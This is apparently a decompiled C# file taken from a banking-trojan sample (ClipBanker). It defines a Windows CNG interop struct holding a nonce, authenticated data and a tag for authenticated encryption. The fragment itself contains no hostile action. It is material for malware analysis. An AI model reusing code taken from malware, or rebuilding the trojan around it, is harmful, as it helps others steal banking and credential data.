// Decompiled with JetBrains decompiler
// Type: FtpClient.Models.Enums.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using System;
using System.Runtime.InteropServices;

namespace FtpClient.Models.Enums
{
  public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
  {
    public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;
    public int cbSize;
    public int dwInfoVersion;
    public IntPtr pbNonce;
    public int cbNonce;
    public IntPtr pbAuthData;
    public int cbAuthData;
    public IntPtr pbTag;
    public int cbTag;
    public IntPtr pbMacContext;
    public int cbMacContext;
    public int cbAAD;
    public long cbData;
    public int dwFlags;

    public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
      : this()
    {
      this.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO.BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
      this.cbSize = Marshal.SizeOf(typeof (BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
      if (iv != null)
      {
        this.cbNonce = iv.Length;
        this.pbNonce = Marshal.AllocHGlobal(this.cbNonce);
        Marshal.Copy(iv, 0, this.pbNonce, this.cbNonce);
      }
      if (aad != null)
      {
        this.cbAuthData = aad.Length;
        this.pbAuthData = Marshal.AllocHGlobal(this.cbAuthData);
        Marshal.Copy(aad, 0, this.pbAuthData, this.cbAuthData);
      }
      if (tag == null)
        return;
      this.cbTag = tag.Length;
      this.pbTag = Marshal.AllocHGlobal(this.cbTag);
      Marshal.Copy(tag, 0, this.pbTag, this.cbTag);
      this.cbMacContext = tag.Length;
      this.pbMacContext = Marshal.AllocHGlobal(this.cbMacContext);
    }

    public void Dispose()
    {
      if (this.pbNonce != IntPtr.Zero)
        Marshal.FreeHGlobal(this.pbNonce);
      if (this.pbTag != IntPtr.Zero)
        Marshal.FreeHGlobal(this.pbTag);
      if (this.pbAuthData != IntPtr.Zero)
        Marshal.FreeHGlobal(this.pbAuthData);
      if (!(this.pbMacContext != IntPtr.Zero))
        return;
      Marshal.FreeHGlobal(this.pbMacContext);
    }
  }
}
